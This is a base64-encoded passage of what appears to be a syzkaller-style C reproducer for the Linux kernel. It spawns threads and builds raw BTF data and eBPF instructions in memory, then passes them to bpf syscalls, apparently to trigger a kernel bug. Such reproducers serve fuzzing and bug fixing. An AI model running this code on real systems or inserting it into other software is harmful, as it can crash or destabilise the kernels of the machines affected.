IGNhbGwsIHRocmVhZDsKCWZvciAoY2FsbCA9IDA7IGNhbGwgPCAzOyBjYWxsKyspIHsKCQlmb3Ig
KHRocmVhZCA9IDA7IHRocmVhZCA8IChpbnQpKHNpemVvZih0aHJlYWRzKSAvIHNpemVvZih0aHJl
YWRzWzBdKSk7IHRocmVhZCsrKSB7CgkJCXN0cnVjdCB0aHJlYWRfdCogdGggPSAmdGhyZWFkc1t0
aHJlYWRdOwoJCQlpZiAoIXRoLT5jcmVhdGVkKSB7CgkJCQl0aC0+Y3JlYXRlZCA9IDE7CgkJCQll
dmVudF9pbml0KCZ0aC0+cmVhZHkpOwoJCQkJZXZlbnRfaW5pdCgmdGgtPmRvbmUpOwoJCQkJZXZl
bnRfc2V0KCZ0aC0+ZG9uZSk7CgkJCQl0aHJlYWRfc3RhcnQodGhyLCB0aCk7CgkJCX0KCQkJaWYg
KCFldmVudF9pc3NldCgmdGgtPmRvbmUpKQoJCQkJY29udGludWU7CgkJCWV2ZW50X3Jlc2V0KCZ0
aC0+ZG9uZSk7CgkJCXRoLT5jYWxsID0gY2FsbDsKCQkJX19hdG9taWNfZmV0Y2hfYWRkKCZydW5u
aW5nLCAxLCBfX0FUT01JQ19SRUxBWEVEKTsKCQkJZXZlbnRfc2V0KCZ0aC0+cmVhZHkpOwoJCQlp
ZiAoY2FsbCA9PSAxKQoJCQkJYnJlYWs7CgkJCWV2ZW50X3RpbWVkd2FpdCgmdGgtPmRvbmUsIDUw
KTsKCQkJYnJlYWs7CgkJfQoJfQoJZm9yIChpID0gMDsgaSA8IDEwMCAmJiBfX2F0b21pY19sb2Fk
X24oJnJ1bm5pbmcsIF9fQVRPTUlDX1JFTEFYRUQpOyBpKyspCgkJc2xlZXBfbXMoMSk7Cn0KCnVp
bnQ2NF90IHJbMV0gPSB7MHhmZmZmZmZmZmZmZmZmZmZmfTsKCnZvaWQgZXhlY3V0ZV9jYWxsKGlu
dCBjYWxsKQp7CgkJaW50cHRyX3QgcmVzID0gMDsKCXN3aXRjaCAoY2FsbCkgewoJY2FzZSAwOgoq
KHVpbnQ2NF90KikweDIwMDA0ZTQwID0gMHgyMDAwNGM4MDsKKih1aW50MTZfdCopMHgyMDAwNGM4
MCA9IDB4ZWI5ZjsKKih1aW50OF90KikweDIwMDA0YzgyID0gMTsKKih1aW50OF90KikweDIwMDA0
YzgzID0gMDsKKih1aW50MzJfdCopMHgyMDAwNGM4NCA9IDB4MTg7CioodWludDMyX3QqKTB4MjAw
MDRjODggPSAwOwoqKHVpbnQzMl90KikweDIwMDA0YzhjID0gMHhjOwoqKHVpbnQzMl90KikweDIw
MDA0YzkwID0gMHhjOwoqKHVpbnQzMl90KikweDIwMDA0Yzk0ID0gMHhhOwoqKHVpbnQzMl90Kikw
eDIwMDA0Yzk4ID0gODsKKih1aW50MTZfdCopMHgyMDAwNGM5YyA9IDA7CioodWludDhfdCopMHgy
MDAwNGM5ZSA9IDA7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDA0YzlmLCA1LCAw
LCA3KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDRjOWYsIDAsIDcsIDEpOwoq
KHVpbnQzMl90KikweDIwMDA0Y2EwID0gNjsKKih1aW50OF90KikweDIwMDA0Y2E0ID0gMDsKKih1
aW50OF90KikweDIwMDA0Y2E1ID0gMHgzMDsKKih1aW50OF90KikweDIwMDA0Y2E2ID0gMDsKKih1
aW50OF90KikweDIwMDA0Y2E3ID0gMHgzMDsKKih1aW50OF90KikweDIwMDA0Y2E4ID0gMHg2MTsK
Kih1aW50OF90KikweDIwMDA0Y2E5ID0gMHgxZTsKKih1aW50OF90KikweDIwMDA0Y2FhID0gMHgy
ZjsKKih1aW50OF90KikweDIwMDA0Y2FiID0gMHgzMDsKKih1aW50OF90KikweDIwMDA0Y2FjID0g
MHgyZTsKKih1aW50OF90KikweDIwMDA0Y2FkID0gMDsKKih1aW50NjRfdCopMHgyMDAwNGU0OCA9
IDA7CioodWludDMyX3QqKTB4MjAwMDRlNTAgPSAweDJlOwoqKHVpbnQzMl90KikweDIwMDA0ZTU0
ID0gMDsKKih1aW50MzJfdCopMHgyMDAwNGU1OCA9IDE7CioodWludDMyX3QqKTB4MjAwMDRlNWMg
PSAweDQwOwoJCXJlcyA9IHN5c2NhbGwoX19OUl9icGYsIC8qY21kPSovMHgxMnVsLCAvKmFyZz0q
LzB4MjAwMDRlNDB1bCwgLypzaXplPSovMHgyMHVsKTsKCQlpZiAocmVzICE9IC0xKQoJCQkJclsw
XSA9IHJlczsKCQlicmVhazsKCWNhc2UgMToKKih1aW50MzJfdCopMHgyMDAwMDQ4MCA9IDY7Cioo
dWludDMyX3QqKTB4MjAwMDA0ODQgPSAweDI3OwoqKHVpbnQ2NF90KikweDIwMDAwNDg4ID0gMHgy
MDAwMGQ0MDsKKih1aW50OF90KikweDIwMDAwZDQwID0gMHgxODsKU1RPUkVfQllfQklUTUFTSyh1
aW50OF90LCAsIDB4MjAwMDBkNDEsIDAsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ0MSwgMCwgNCwgNCk7CioodWludDE2X3QqKTB4MjAwMDBkNDIgPSAwOwoqKHVp
bnQzMl90KikweDIwMDAwZDQ0ID0gODsKKih1aW50OF90KikweDIwMDAwZDQ4ID0gMDsKKih1aW50
OF90KikweDIwMDAwZDQ5ID0gMDsKKih1aW50MTZfdCopMHgyMDAwMGQ0YSA9IDA7CioodWludDMy
X3QqKTB4MjAwMDBkNGMgPSA3OwoqKHVpbnQ4X3QqKTB4MjAwMDBkNTAgPSAweDE4OwpTVE9SRV9C
WV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGQ1MSwgMSwgMCwgNCk7ClNUT1JFX0JZX0JJVE1B
U0sodWludDhfdCwgLCAweDIwMDAwZDUxLCAxLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGQ1
MiA9IDA7CioodWludDMyX3QqKTB4MjAwMDBkNTQgPSAtMTsKKih1aW50OF90KikweDIwMDAwZDU4
ID0gMDsKKih1aW50OF90KikweDIwMDAwZDU5ID0gMDsKKih1aW50MTZfdCopMHgyMDAwMGQ1YSA9
IDA7CioodWludDMyX3QqKTB4MjAwMDBkNWMgPSAwOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ2MCwgNywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIw
MDAwZDYwLCAwLCAzLCAxKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjAs
IDB4YiwgNCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDYxLCAyLCAw
LCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjEsIDAsIDQsIDQpOwoq
KHVpbnQxNl90KikweDIwMDAwZDYyID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGQ2NCA9IDB4MTQ7
ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDY4LCA3LCAwLCAzKTsKU1RPUkVf
QllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjgsIDAsIDMsIDEpOwpTVE9SRV9CWV9CSVRN
QVNLKHVpbnQ4X3QsICwgMHgyMDAwMGQ2OCwgMHhiLCA0LCA0KTsKU1RPUkVfQllfQklUTUFTSyh1
aW50OF90LCAsIDB4MjAwMDBkNjksIDMsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ2OSwgMCwgNCwgNCk7CioodWludDE2X3QqKTB4MjAwMDBkNmEgPSAwOwoqKHVp
bnQzMl90KikweDIwMDAwZDZjID0gMDsKKih1aW50OF90KikweDIwMDAwZDcwID0gMHg4NTsKKih1
aW50OF90KikweDIwMDAwZDcxID0gMDsKKih1aW50MTZfdCopMHgyMDAwMGQ3MiA9IDA7CioodWlu
dDMyX3QqKTB4MjAwMDBkNzQgPSAweDgzOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGQ3OCwgNywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDc4
LCAxLCAzLCAxKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNzgsIDB4Yiwg
NCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDc5LCA5LCAwLCA0KTsK
U1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNzksIDAsIDQsIDQpOwoqKHVpbnQx
Nl90KikweDIwMDAwZDdhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGQ3YyA9IDA7ClNUT1JFX0JZ
X0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDgwLCA1LCAwLCAzKTsKU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBkODAsIDAsIDMsIDEpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4
X3QsICwgMHgyMDAwMGQ4MCwgNSwgNCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAw
eDIwMDAwZDgxLCA5LCAwLCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBk
ODEsIDAsIDQsIDQpOwoqKHVpbnQxNl90KikweDIwMDAwZDgyID0gMTsKKih1aW50MzJfdCopMHgy
MDAwMGQ4NCA9IDA7CioodWludDhfdCopMHgyMDAwMGQ4OCA9IDB4OTU7CioodWludDhfdCopMHgy
MDAwMGQ4OSA9IDA7CioodWludDE2X3QqKTB4MjAwMDBkOGEgPSAwOwoqKHVpbnQzMl90KikweDIw
MDAwZDhjID0gMDsKKih1aW50OF90KikweDIwMDAwZDkwID0gMHgxODsKU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBkOTEsIDEsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4
X3QsICwgMHgyMDAwMGQ5MSwgMSwgNCwgNCk7CioodWludDE2X3QqKTB4MjAwMDBkOTIgPSAwOwoq
KHVpbnQzMl90KikweDIwMDAwZDk0ID0gLTE7CioodWludDhfdCopMHgyMDAwMGQ5OCA9IDA7Cioo
dWludDhfdCopMHgyMDAwMGQ5OSA9IDA7CioodWludDE2X3QqKTB4MjAwMDBkOWEgPSAwOwoqKHVp
bnQzMl90KikweDIwMDAwZDljID0gMDsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAw
MDBkYTAsIDcsIDAsIDMpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRhMCwg
MCwgMywgMSk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGEwLCAweGIsIDQs
IDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRhMSwgMiwgMCwgNCk7ClNU
T1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGExLCAwLCA0LCA0KTsKKih1aW50MTZf
dCopMHgyMDAwMGRhMiA9IDA7CioodWludDMyX3QqKTB4MjAwMDBkYTQgPSAwOwoqKHVpbnQ4X3Qq
KTB4MjAwMDBkYTggPSAweDg1OwoqKHVpbnQ4X3QqKTB4MjAwMDBkYTkgPSAwOwoqKHVpbnQxNl90
KikweDIwMDAwZGFhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGRhYyA9IDB4ODY7CioodWludDhf
dCopMHgyMDAwMGRiMCA9IDB4MTg7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAw
ZGIxLCAxLCAwLCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkYjEsIDAs
IDQsIDQpOwoqKHVpbnQxNl90KikweDIwMDAwZGIyID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGRi
NCA9IDB4MjU3MDIwMjA7CioodWludDhfdCopMHgyMDAwMGRiOCA9IDA7CioodWludDhfdCopMHgy
MDAwMGRiOSA9IDA7CioodWludDE2X3QqKTB4MjAwMDBkYmEgPSAwOwoqKHVpbnQzMl90KikweDIw
MDAwZGJjID0gMHgyMDIwMjAwMDsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBk
YzAsIDMsIDAsIDMpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRjMCwgMywg
MywgMik7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGMwLCAzLCA1LCAzKTsK
U1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkYzEsIDB4YSwgMCwgNCk7ClNUT1JF
X0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGMxLCAxLCA0LCA0KTsKKih1aW50MTZfdCop
MHgyMDAwMGRjMiA9IDB4ZmZmODsKKih1aW50MzJfdCopMHgyMDAwMGRjNCA9IDA7ClNUT1JFX0JZ
X0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGM4LCA3LCAwLCAzKTsKU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBkYzgsIDEsIDMsIDEpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4
X3QsICwgMHgyMDAwMGRjOCwgMHhiLCA0LCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAs
IDB4MjAwMDBkYzksIDEsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAw
MGRjOSwgMHhhLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGRjYSA9IDA7CioodWludDMyX3Qq
KTB4MjAwMDBkY2MgPSAwOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRkMCwg
NywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGQwLCAwLCAzLCAx
KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkZDAsIDAsIDQsIDQpOwpTVE9S
RV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRkMSwgMSwgMCwgNCk7ClNUT1JFX0JZX0JJ
VE1BU0sodWludDhfdCwgLCAweDIwMDAwZGQxLCAwLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAw
MGRkMiA9IDA7CioodWludDMyX3QqKTB4MjAwMDBkZDQgPSAweGZmZmZmZmY4OwpTVE9SRV9CWV9C
SVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRkOCwgNywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0so
dWludDhfdCwgLCAweDIwMDAwZGQ4LCAwLCAzLCAxKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90
LCAsIDB4MjAwMDBkZDgsIDB4YiwgNCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAw
eDIwMDAwZGQ5LCAyLCAwLCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBk
ZDksIDAsIDQsIDQpOwoqKHVpbnQxNl90KikweDIwMDAwZGRhID0gMDsKKih1aW50MzJfdCopMHgy
MDAwMGRkYyA9IDg7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGUwLCA3LCAw
LCAzKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkZTAsIDAsIDMsIDEpOwpT
VE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRlMCwgMHhiLCA0LCA0KTsKU1RPUkVf
QllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkZTEsIDMsIDAsIDQpOwpTVE9SRV9CWV9CSVRN
QVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRlMSwgMCwgNCwgNCk7CioodWludDE2X3QqKTB4MjAwMDBk
ZTIgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwZGU0ID0gMHhmZmZmOwoqKHVpbnQ4X3QqKTB4MjAw
MDBkZTggPSAweDg1OwoqKHVpbnQ4X3QqKTB4MjAwMDBkZTkgPSAwOwoqKHVpbnQxNl90KikweDIw
MDAwZGVhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGRlYyA9IDY7CioodWludDhfdCopMHgyMDAw
MGRmMCA9IDB4MTg7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGYxLCAxLCAw
LCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkZjEsIDAsIDQsIDQpOwoq
KHVpbnQxNl90KikweDIwMDAwZGYyID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGRmNCA9IDB4MjU2
YzZjNjQ7CioodWludDhfdCopMHgyMDAwMGRmOCA9IDA7CioodWludDhfdCopMHgyMDAwMGRmOSA9
IDA7CioodWludDE2X3QqKTB4MjAwMDBkZmEgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwZGZjID0g
MHgyMDIwMjAwMDsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMDAsIDMsIDAs
IDMpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwMCwgMywgMywgMik7ClNU
T1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTAwLCAzLCA1LCAzKTsKU1RPUkVfQllf
QklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMDEsIDB4YSwgMCwgNCk7ClNUT1JFX0JZX0JJVE1B
U0sodWludDhfdCwgLCAweDIwMDAwZTAxLCAxLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGUw
MiA9IDB4ZmZmODsKKih1aW50MzJfdCopMHgyMDAwMGUwNCA9IDA7ClNUT1JFX0JZX0JJVE1BU0so
dWludDhfdCwgLCAweDIwMDAwZTA4LCA3LCAwLCAzKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90
LCAsIDB4MjAwMDBlMDgsIDEsIDMsIDEpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGUwOCwgMHhiLCA0LCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBl
MDksIDEsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwOSwgMHhh
LCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGUwYSA9IDA7CioodWludDMyX3QqKTB4MjAwMDBl
MGMgPSAwOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUxMCwgNywgMCwgMyk7
ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTEwLCAwLCAzLCAxKTsKU1RPUkVf
QllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMTAsIDAsIDQsIDQpOwpTVE9SRV9CWV9CSVRN
QVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUxMSwgMSwgMCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWlu
dDhfdCwgLCAweDIwMDAwZTExLCAwLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGUxMiA9IDA7
CioodWludDMyX3QqKTB4MjAwMDBlMTQgPSAweGZmZmZmZmY4OwpTVE9SRV9CWV9CSVRNQVNLKHVp
bnQ4X3QsICwgMHgyMDAwMGUxOCwgNywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwg
LCAweDIwMDAwZTE4LCAwLCAzLCAxKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAw
MDBlMTgsIDB4YiwgNCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTE5
LCAyLCAwLCA0KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMTksIDAsIDQs
IDQpOwoqKHVpbnQxNl90KikweDIwMDAwZTFhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGUxYyA9
IDg7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTIwLCA3LCAwLCAzKTsKU1RP
UkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMjAsIDAsIDMsIDEpOwpTVE9SRV9CWV9C
SVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUyMCwgMHhiLCA0LCA0KTsKU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBlMjEsIDMsIDAsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4
X3QsICwgMHgyMDAwMGUyMSwgMCwgNCwgNCk7CioodWludDE2X3QqKTB4MjAwMDBlMjIgPSAwOwoq
KHVpbnQzMl90KikweDIwMDAwZTI0ID0gNzsKKih1aW50OF90KikweDIwMDAwZTI4ID0gMHg4NTsK
Kih1aW50OF90KikweDIwMDAwZTI5ID0gMDsKKih1aW50MTZfdCopMHgyMDAwMGUyYSA9IDA7Cioo
dWludDMyX3QqKTB4MjAwMDBlMmMgPSA2OwoqKHVpbnQ4X3QqKTB4MjAwMDBlMzAgPSAweDE4OwpT
VE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUzMSwgOCwgMCwgNCk7ClNUT1JFX0JZ
X0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTMxLCA1LCA0LCA0KTsKKih1aW50MTZfdCopMHgy
MDAwMGUzMiA9IDA7CioodWludDMyX3QqKTB4MjAwMDBlMzQgPSAxOwoqKHVpbnQ4X3QqKTB4MjAw
MDBlMzggPSAwOwoqKHVpbnQ4X3QqKTB4MjAwMDBlMzkgPSAwOwoqKHVpbnQxNl90KikweDIwMDAw
ZTNhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGUzYyA9IDA7CioodWludDhfdCopMHgyMDAwMGU0
MCA9IDB4MTg7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTQxLCA2LCAwLCA0
KTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNDEsIDYsIDQsIDQpOwoqKHVp
bnQxNl90KikweDIwMDAwZTQyID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGU0NCA9IDQ7CioodWlu
dDhfdCopMHgyMDAwMGU0OCA9IDA7CioodWludDhfdCopMHgyMDAwMGU0OSA9IDA7CioodWludDE2
X3QqKTB4MjAwMDBlNGEgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwZTRjID0gMHhmZmZmZmZmYjsK
U1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTAsIDcsIDAsIDMpOwpTVE9SRV9C
WV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU1MCwgMSwgMywgMSk7ClNUT1JFX0JZX0JJVE1B
U0sodWludDhfdCwgLCAweDIwMDAwZTUwLCAweGIsIDQsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVp
bnQ4X3QsICwgMHgyMDAwMGU1MSwgMSwgMCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwg
LCAweDIwMDAwZTUxLCA5LCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGU1MiA9IDA7CioodWlu
dDMyX3QqKTB4MjAwMDBlNTQgPSAwOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAw
MGU1OCwgNywgMCwgMyk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTU4LCAw
LCAzLCAxKTsKU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTgsIDB4YiwgNCwg
NCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTU5LCAyLCAwLCA0KTsKU1RP
UkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTksIDAsIDQsIDQpOwoqKHVpbnQxNl90
KikweDIwMDAwZTVhID0gMDsKKih1aW50MzJfdCopMHgyMDAwMGU1YyA9IDA7CioodWludDhfdCop
MHgyMDAwMGU2MCA9IDB4ODU7CioodWludDhfdCopMHgyMDAwMGU2MSA9IDA7CioodWludDE2X3Qq
KTB4MjAwMDBlNjIgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwZTY0ID0gMHg4NDsKU1RPUkVfQllf
QklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNjgsIDcsIDAsIDMpOwpTVE9SRV9CWV9CSVRNQVNL
KHVpbnQ4X3QsICwgMHgyMDAwMGU2OCwgMCwgMywgMSk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhf
dCwgLCAweDIwMDAwZTY4LCAweGIsIDQsIDQpOwpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwg
MHgyMDAwMGU2OSwgMCwgMCwgNCk7ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAw
ZTY5LCAwLCA0LCA0KTsKKih1aW50MTZfdCopMHgyMDAwMGU2YSA9IDA7CioodWludDMyX3QqKTB4
MjAwMDBlNmMgPSAwOwoqKHVpbnQ4X3QqKTB4MjAwMDBlNzAgPSAweDk1OwoqKHVpbnQ4X3QqKTB4
MjAwMDBlNzEgPSAwOwoqKHVpbnQxNl90KikweDIwMDAwZTcyID0gMDsKKih1aW50MzJfdCopMHgy
MDAwMGU3NCA9IDA7CioodWludDY0X3QqKTB4MjAwMDA0OTAgPSAweDIwMDAwMDQwOwptZW1jcHko
KHZvaWQqKTB4MjAwMDAwNDAsICJHUExcMDAwIiwgNCk7CioodWludDMyX3QqKTB4MjAwMDA0OTgg
PSAweGI7CioodWludDMyX3QqKTB4MjAwMDA0OWMgPSAweGMwOwoqKHVpbnQ2NF90KikweDIwMDAw
NGEwID0gMHgyMDAwMGM4MDsKKih1aW50MzJfdCopMHgyMDAwMDRhOCA9IDB4NDExMDA7CioodWlu
dDMyX3QqKTB4MjAwMDA0YWMgPSAweDM4OwptZW1zZXQoKHZvaWQqKTB4MjAwMDA0YjAsIDAsIDE2
KTsKKih1aW50MzJfdCopMHgyMDAwMDRjMCA9IDA7CioodWludDMyX3QqKTB4MjAwMDA0YzQgPSAw
eDI1OwoqKHVpbnQzMl90KikweDIwMDAwNGM4ID0gclswXTsKKih1aW50MzJfdCopMHgyMDAwMDRj
YyA9IDg7CioodWludDY0X3QqKTB4MjAwMDA0ZDAgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwNGQ4
ID0gMDsKKih1aW50MzJfdCopMHgyMDAwMDRkYyA9IDB4MTA7CioodWludDY0X3QqKTB4MjAwMDA0
ZTAgPSAweDIwMDAwMmMwOwoqKHVpbnQzMl90KikweDIwMDAwMmMwID0gMDsKKih1aW50MzJfdCop
MHgyMDAwMDJjNCA9IDA7CioodWludDMyX3QqKTB4MjAwMDAyYzggPSAwOwoqKHVpbnQzMl90Kikw
eDIwMDAwMmNjID0gOTsKKih1aW50MzJfdCopMHgyMDAwMDRlOCA9IDE7CioodWludDMyX3QqKTB4
MjAwMDA0ZWMgPSAwOwoqKHVpbnQzMl90KikweDIwMDAwNGYwID0gMDsKKih1aW50MzJfdCopMHgy
MDAwMDRmNCA9IDk7CioodWludDY0X3QqKTB4MjAwMDA0ZjggPSAweDIwMDAwMzgwOwoqKHVpbnQz
Ml90KikweDIwMDAwMzgwID0gLTE7CioodWludDMyX3QqKTB4MjAwMDAzODQgPSAtMTsKKih1aW50
MzJfdCopMHgyMDAwMDM4OCA9IC0xOwoqKHVpbnQ2NF90KikweDIwMDAwNTAwID0gMHgyMDAwMDNj
MDsKKih1aW50MzJfdCopMHgyMDAwMDNjMCA9IDE7CioodWludDMyX3QqKTB4MjAwMDAzYzQgPSA0
OwoqKHVpbnQzMl90KikweDIwMDAwM2M4ID0gMHhiOwoqKHVpbnQzMl90KikweDIwMDAwM2NjID0g
NjsKKih1aW50MzJfdCopMHgyMDAwMDNkMCA9IDI7CioodWludDMyX3QqKTB4MjAwMDAzZDQgPSAy
OwoqKHVpbnQzMl90KikweDIwMDAwM2Q4ID0gMTsKKih1aW50MzJfdCopMHgyMDAwMDNkYyA9IDA7
CioodWludDMyX3QqKTB4MjAwMDAzZTAgPSA1OwoqKHVpbnQzMl90KikweDIwMDAwM2U0ID0gNDsK
Kih1aW50MzJfdCopMHgyMDAwMDNlOCA9IDB4ZTsKKih1aW50MzJfdCopMHgyMDAwMDNlYyA9IDB4
YjsKKih1aW50MzJfdCopMHgyMDAwMDNmMCA9IDI7CioodWludDMyX3QqKTB4MjAwMDAzZjQgPSAw
eDEwMDAwMDM7CioodWludDMyX3QqKTB4MjAwMDAzZjggPSAyOwoqKHVpbnQzMl90KikweDIwMDAw
